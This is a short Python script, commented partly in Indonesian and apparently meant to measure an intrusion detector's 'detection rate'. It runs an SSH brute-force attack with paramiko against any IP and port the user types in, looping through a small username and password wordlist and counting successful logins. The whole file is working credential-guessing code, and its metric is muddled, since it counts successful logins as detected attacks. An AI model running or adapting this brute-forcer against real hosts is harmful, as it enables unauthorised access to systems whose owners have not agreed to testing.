import paramiko
import time

def run_detection_rate_test(ip, port, username_list, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    total_attacks = len(username_list) * len(password_list)
    detected_attacks = 0

    for username in username_list:
        for password in password_list:
            try:
                print(f"Trying {username}:{password} on {ip}:{port}...")
                ssh.connect(ip, port=port, username=username, password=password, timeout=5)
                detected_attacks += 1  # Serangan terdeteksi (misalnya login berhasil)
            except paramiko.AuthenticationException:
                print(f"Invalid credentials: {username}:{password}")
            except Exception as e:
                print(f"[ERROR] Connection failed: {e}")
            time.sleep(0.5)

    # Hitung Detection Rate
    detection_rate = (detected_attacks / total_attacks) * 100
    print(f"\nDetection Rate: {detection_rate:.2f}% ({detected_attacks}/{total_attacks}) attacks detected.")

if __name__ == "__main__":
    ip_address = input("Enter the IP address or domain to test: ")
    port = int(input("Enter the port (default 22 for SSH): "))

    # Wordlist untuk brute-force
    username_list = ["user1", "user2", "admin"]
    password_list = ["password", "123456", "admin"]

    run_detection_rate_test(ip_address, port, username_list, password_list)